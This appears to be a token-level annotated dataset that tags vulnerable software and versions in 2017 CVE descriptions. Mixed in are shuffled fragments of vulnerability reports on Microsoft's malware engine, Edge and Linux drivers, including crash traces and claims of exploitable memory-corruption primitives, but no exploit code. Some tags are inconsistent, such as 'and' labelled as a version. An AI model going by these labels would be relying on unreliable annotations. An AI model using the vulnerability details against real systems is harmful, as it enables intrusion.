in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engine O O
fails O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Edge O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8598 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

The O O
Microsoft O O
Malware O O
Protection O O
Engine O O
running O O
on O O
Microsoft O O
Forefront O O
and O O
Microsoft O O
Defender O O
on O O
32-bit O O
versions O O
of O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
R2 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
7 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
Server S-vulnerable_version pair_3
2012 S-vulnerable_version pair_3
Gold S-vulnerable_version pair_3
and S-vulnerable_version pair_3
R2 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
RT S-vulnerable_version pair_4
8.1 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
and S-vulnerable_version pair_5
1703 S-vulnerable_version pair_5
does O O
not O O
properly O O
scan O O
a O O
specially O O
crafted O O
file O O
leading O O
to O O
memory O O
corruption O O
. O O

aka O O
Microsoft O O
Malware O O
Protection O O
Engine O O
Remote O O
Code O O
Execution O O
Vulnerability O O
. O O

db6625c8 O O

( O O
gdb O O
) O O
r O O
Starting O O
program O O
: O O
mpclient O O
testcase.exe O O
main O O
( O O
) O O
: O O
Scanning O O
testcase.exe O O
... O O
EngineScanCallback O O
( O O
) O O
: O O
Scanning O O
input O O
Program O O
received O O
signal O O
SIGSEGV O O
, O O
Segmentation O O
fault O O
. O O

db6625d8 O O

db662628 O O

Defaulted O O
to O O
export O O
symbols O O
for O O
mpengine.dll O O
- O O
0192e7f0 O O
66ac184e O O
00370000 O O
00000008 O O
0000cc5c O O
ntdll O O
! O O
RtlAllocateHeap+0x23a O O
( O O
FPO O O
: O O
[ O O
Non-Fpo O O
] O O
) O O
WARNING O O
: O O
Stack O O
unwind O O
information O O
not O O
available O O
. O O

Then O O
you O O
can O O
read O O
and O O
write O O
arbitrary O O
data O O
to O O
an O O
arbitrary O O
offset O O
to O O
the O O
MutableByteStream O O
object O O
buffer O O
. O O

db662608 O O

The O O
testcases O O
have O O
been O O
encrypted O O
to O O
prevent O O
crashing O O
your O O
exchange O O
server O O
. O O

This O O
full O O
system O O
x86 O O
emulator O O
runs O O
as O O
SYSTEM O O
, O O
is O O
unsandboxed O O
, O O
is O O
enabled O O
by O O
default O O
and O O
remotely O O
accessible O O
to O O
attackers O O
. O O

db6625f8 O O

db662618 O O

0xf6e98c08 O O
in O O

See O O
attachment O O
for O O
MpApiCall O O
( O O
) O O
implementation O O
, O O
and O O
pre-compiled O O
testcase O O
, O O
renamed O O
testcase.txt O O
. O O

Note O O
that O O
as O O
soon O O
as O O
the O O
testcase.txt O O
file O O
touches O O
disk O O
, O O
it O O
will O O
immediately O O
crash O O
the O O
MsMpEng O O
service O O
on O O
Windows O O
, O O
which O O
may O O
destabilize O O
your O O
system O O
. O O

I O O
asked O O
Microsoft O O
if O O
this O O
was O O
intentionally O O
exposed O O
, O O
and O O
they O O
replied O O
The O O
apicall O O
instruction O O
is O O
exposed O O
for O O
multiple O O
reasons O O
, O O
so O O
this O O
is O O
intentional O O
. O O

Here O O
is O O
a O O
better O O
testcase O O
that O O
crashes O O
in O O
a O O
memcpy O O
to O O
a O O
bad O O
destination O O
offset O O
. O O

Following O O
frames O O
may O O
be O O
wrong O O
. O O

db6625e8 O O

I O O
took O O
a O O
quick O O
stab O O
at O O
writing O O
a O O
fuzzer O O
and O O
immediately O O
found O O
heap O O
corruption O O
in O O
the O O
KERNEL32.DLL O O
! O O
VFS_Write O O
API O O
, O O
I O O
suspect O O
this O O
has O O
never O O
been O O
fuzzed O O
before O O
. O O

This O O
is O O
a O O
very O O
powerful O O
exploit O O
primitive O O
, O O
and O O
exploitation O O
does O O
not O O
seem O O
difficult O O
. O O

Microsoft O O
MsMpEng O O
- O O
mpengine O O
x86 O O
Emulator O O
Heap O O
Corruption O O
in O O
VFS O O
API O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
obtain O O
information O O
to O O
further O O
compromise O O
the O O
user O O
system O O
when O O
Microsoft O O
Edge O O
improperly O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8499 O O
, O O
CVE-2017-8520 O O
, O O
CVE-2017-8521 O O
, O O
and O O
CVE-2017-8548 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8499 O O
, O O
CVE-2017-8520 O O
, O O
CVE-2017-8521 O O
, O O
and O O
CVE-2017-8549 O O
. O O

Microsoft O O
Edge O O
Chakra O O
- O O
Incorrect O O
JIT O O
Optimization O O
with O O
TypedArray O O
Setter O O
2 O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8519 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
and O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
Internet O O
Explorer O O
improperly O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Malware O O
Protection O O
Engine O O
running O O
on O O
Microsoft O O
Forefront O O
and O O
Microsoft O O
Defender O O
on O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
R2 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
7 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
Server S-vulnerable_version pair_3
2012 S-vulnerable_version pair_3
Gold S-vulnerable_version pair_3
and S-vulnerable_version pair_3
R2 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
RT S-vulnerable_version pair_4
8.1 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
and S-vulnerable_version pair_5
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
, O O
Microsoft S-vulnerable_software pair_7
Exchange S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
2013 S-vulnerable_version pair_7
and S-vulnerable_version pair_7
2016 S-vulnerable_version pair_7
, O O
does O O
not O O
properly O O
scan O O
a O O
specially O O
crafted O O
file O O
leading O O
to O O
memory O O
corruption O O
. O O

aka O O
Microsoft O O
Malware O O
Protection O O
Engine O O
Remote O O
Code O O
Execution O O
Vulnerability O O
, O O
a O O
different O O
vulnerability O O
than O O
CVE-2017-8538 O O
and O O
CVE-2017-8540 O O
. O O

Microsoft O O
MsMpEng O O
- O O
Use-After-Free O O
via O O
Saved O O
Callers O O

aka O O
Microsoft O O
Malware O O
Protection O O
Engine O O
Remote O O
Code O O
Execution O O
Vulnerability O O
, O O
a O O
different O O
vulnerability O O
than O O
CVE-2017-8538 O O
and O O
CVE-2017-8541 O O
. O O

Microsoft O O
MsMpEng O O
- O O
Remote O O
Use-After-Free O O
Due O O
to O O
Design O O
Issue O O
in O O
GC O O
Engine O O

aka O O
Microsoft O O
Malware O O
Protection O O
Engine O O
Remote O O
Code O O
Execution O O
Vulnerability O O
, O O
a O O
different O O
vulnerability O O
than O O
CVE-2017-8540 O O
and O O
CVE-2017-8541 O O
. O O

Attached O O
is O O
a O O
ZIP O O
archive O O
( O O
password O O
: O O
mpengbugs O O
) O O
with O O
up O O
to O O
3 O O
testcases O O
for O O
each O O
of O O
the O O
9 O O
unique O O
crashes O O
. O O

We O O
have O O
verified O O
that O O
all O O
listed O O
crashes O O
occur O O
on O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
as O O
soon O O
as O O
an O O
offending O O
sample O O
is O O
saved O O
to O O
disk O O
and O O
discovered O O
by O O
MsMpEng O O
. O O

Through O O
fuzzing O O
, O O
we O O
have O O
discovered O O
a O O
number O O
of O O
ways O O
to O O
crash O O
the O O
service O O
( O O
and O O
specifically O O
code O O
in O O
the O O
mpengine.dll O O
module O O
) O O
, O O
by O O
feeding O O
it O O
with O O
malformed O O
input O O
testcases O O
to O O
scan O O
. O O

For O O
corruption_1-2 O O
, O O
the O O
PageHeap O O
mechanism O O
must O O
be O O
enabled O O
for O O
the O O
MsMpEng.exe O O
program O O
in O O
order O O
to O O
reliably O O
observe O O
the O O
unhandled O O
exception O O
. O O

netvm_parse_routine_netinvoke_handle_t O O
| O O
Different O O
crashes O O
with/out O O
PageHeap O O
. O O

invalid O O
read O O
. O O

On O O
the O O
other O O
hand O O
, O O
null_1-4 O O
, O O
div_by_zero O O
and O O
recursion O O
are O O
low O O
severity O O
bugs O O
that O O
can O O
only O O
be O O
used O O
to O O
bring O O
the O O
service O O
process O O
down O O
. O O

corruption_3 O O
| O O
Unspecified O O
memory O O
corruption O O
( O O
) O O

corruption_2 O O
| O O
Heap O O
corruption O O
| O O
PageHeap O O
for O O
MpMsEng.exe O O
free O O
( O O
) O O
called O O
by O O
CRsaPublicKey O O
Decrypt_uchar O O
| O O
May O O
crash O O
in O O
other O O
ways O O
, O O
e.g O O
. O O

Microsoft O O
MsMpEng O O
- O O
Multiple O O
Crashes O O
While O O
Scanning O O
Malformed O O
Files O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
and S-vulnerable_version pair_5
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engines O O
fail O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
browsers O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8517 O O
and O O
CVE-2017-8522 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8517 O O
and O O
CVE-2017-8524 O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
8.1 S-vulnerable_version pair_0
and O O
Windows S-vulnerable_software pair_1
RT S-vulnerable_version pair_1
8.1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
2012 S-vulnerable_version pair_2
and S-vulnerable_version pair_2
R2 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
10 S-vulnerable_version pair_3
Gold S-vulnerable_version pair_3
, O O
1511 S-vulnerable_version pair_3
, O O
1607 S-vulnerable_version pair_3
, O O
and S-vulnerable_version pair_3
1703 S-vulnerable_version pair_3
, O O
and O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2016 S-vulnerable_version pair_4
allow O O
an O O
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engines O O
fail O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
browsers O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
Edge O O
JavaScript O O
scripting O O
engine O O
fails O O
to O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8499 O O
, O O
CVE-2017-8520 O O
, O O
CVE-2017-8548 O O
, O O
and O O
CVE-2017-8549 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8499 O O
, O O
CVE-2017-8521 O O
, O O
CVE-2017-8548 O O
, O O
and O O
CVE-2017-8549 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
and O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
Internet O O
Explorer O O
improperly O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8547 O O
. O O

Microsoft O O
Edge O O
allows O O
a O O
remote O O
code O O
execution O O
vulnerability O O
due O O
to O O
the O O
way O O
it O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8522 O O
and O O
CVE-2017-8524 O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
SP2 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
R2 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
8.1 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
RT S-vulnerable_version pair_2
8.1 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
Server S-vulnerable_version pair_3
2012 S-vulnerable_version pair_3
and S-vulnerable_version pair_3
R2 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
10 S-vulnerable_version pair_4
Gold S-vulnerable_version pair_4
, O O
1511 S-vulnerable_version pair_4
, O O
1607 S-vulnerable_version pair_4
, O O
and S-vulnerable_version pair_4
1703 S-vulnerable_version pair_4
, O O
and O O
Windows S-vulnerable_software pair_5
Server S-vulnerable_version pair_5
2016 S-vulnerable_version pair_5
allow O O
an O O
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engines O O
fail O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
browsers O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8501 O O
. O O

Microsoft O O
Office O O
allows O O
a O O
remote O O
code O O
execution O O
vulnerability O O
due O O
to O O
the O O
way O O
that O O
it O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8520 O O
, O O
CVE-2017-8521 O O
, O O
CVE-2017-8548 O O
, O O
and O O
CVE-2017-8549 O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1607 S-vulnerable_version pair_0
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
Microsoft O O
Edge O O
improperly O O
accesses O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Edge O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8496 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8497 O O
. O O

The O O
vulnerability O O
has O O
been O O
confirmed O O
on O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Enterprise S-vulnerable_version pair_0
64-bit O O
( O O
OS O O
version O O
1607 O O
, O O
OS O O
build O O
14393.1198 O O
) O O
and O O
Microsoft S-vulnerable_software pair_1
Edge S-vulnerable_software pair_1
38.14393.1066.0 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
EdgeHTML S-vulnerable_software pair_2
14.14393 S-vulnerable_version pair_2
. O O

drivers/net/usb/catc.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.9.11 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

As O O
noted O O
, O O
the O O
commit O O
below O O
doesn O O
t O O
fix O O
the O O
mmap O O
side O O
. O O

CONFIG_STRICT_DEVMEM O O
exists O O
to O O
prevent O O
userland O O
from O O
directly O O
modifying O O
kernel O O
memory O O
, O O
yet O O
the O O
kernel O O
will O O
happily O O
make O O
slab O O
allocations O O
in O O
allowed O O
regions O O
below O O
1MB O O
. O O

I O O
say O O
this O O
because O O
the O O
commit O O
message O O
makes O O
no O O
mention O O
of O O
this O O
partially O O
fixing O O
a O O
CONFIG_STRICT_DEVMEM O O
bypass O O
( O O
and O O
I O O
suppose O O
a O O
Secure O O
Boot O O
bypass O O
, O O
but O O
what O O
isn O O
t O O
these O O
days O O

CONFIG_STRICT_DEVMEM O O
explicitly O O
allowed O O
both O O
reads O O
and O O
writes O O
to O O
these O O
allocations O O
. O O

) O O
, O O
and O O
similarly O O
makes O O
no O O
mentions O O
of O O
the O O
modifications O O
it O O
makes O O
to O O
the O O
write O O
side O O
. O O

Subject O O
: O O
Silently O O
( O O
or O O
obliviously O O
) O O
partially-fixed O O
CONFIG_STRICT_DEVMEM O O
bypass O O

drivers/net/usb/rtl8150.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.9.11 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/net/usb/pegasus.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.9.11 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/char/virtio_console.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.10.12 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/net/can/usb/gs_usb.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.10.2 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

crypto/ccm.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
through S-vulnerable_version pair_0
4.10.12 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/media/usb/dvb-usb-v2/dvb_usb_core.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.10.12 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/media/usb/dvb-usb/dw2102.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.10.4 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

drivers/media/usb/dvb-usb/dvb-usb-firmware.c O O
in O O
the O O
Linux S-vulnerable_software pair_0
kernel S-vulnerable_software pair_0
4.9.x S-vulnerable_version pair_0
and S-vulnerable_version pair_0
4.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.10.7 S-vulnerable_version pair_0
interacts O O
incorrectly O O
with O O
the O O
CONFIG_VMAP_STACK O O
option O O
, O O
which O O
allows O O
local O O
users O O
to O O
cause O O
a O O
denial O O
of O O
service O O
( O O
system O O
crash O O
or O O
memory O O
corruption O O
) O O
or O O
possibly O O
have O O
unspecified O O
other O O
impact O O
by O O
leveraging O O
use O O
of O O
more O O
than O O
one O O
virtual O O
page O O
for O O
a O O
DMA O O
scatterlist O O
. O O

This O O
vulnerability O O
occurs O O
when O O
fill O O
settings O O
are O O
intentionally O O
malformed O O
and O O
is O O
opened O O
in O O
a O O
standalone O O
state O O
, O O
without O O
connection O O
to O O
a O O
protection O O
relay O O
. O O

All O O
versions O O
of O O
VAMPSET S-vulnerable_software pair_0
software O O
produced O O
by O O
Schneider O O
Electric O O
, O O
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
V2.2.189 S-vulnerable_version pair_0
, O O
are O O
susceptible O O
to O O
a O O
memory O O
corruption O O
vulnerability O O
when O O
a O O
corrupted O O
vf2 O O
file O O
is O O
used O O
. O O

This O O
vulnerability O O
causes O O
the O O
software O O
to O O
halt O O
or O O
not O O
start O O
when O O
trying O O
to O O
open O O
the O O
corrupted O O
file O O
. O O

As O O
Windows O O
operating O O
system O O
remains O O
operational O O
and O O
VAMPSET O O
responds O O
, O O
it O O
is O O
able O O
to O O
be O O
